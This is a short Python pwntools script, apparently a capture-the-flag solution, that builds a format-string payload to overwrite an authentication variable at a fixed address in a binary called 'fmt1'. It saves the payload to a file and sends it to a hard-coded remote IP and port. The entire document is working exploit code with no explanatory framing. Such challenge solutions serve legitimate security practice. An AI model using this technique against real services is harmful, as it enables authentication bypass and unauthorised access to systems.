from pwn import *
# context.binary = ELF('./fmt1')

# Depending on your machine, the fmtstr_payload may differ
context.arch = "x86_64"
AUTH_ADDR = 0x404050
def solve():
    # p = process()
    ip = "104.248.97.237"
    # p = remote("localhost", 2004)
    p = remote(ip, 1347)
    payload = fmtstr_payload(6, {AUTH_ADDR : 13})
    with open('input.txt', 'wb') as f:
        f.write(payload)
    p.sendline(payload)
    log.info(p.clean())
    p.close()

solve()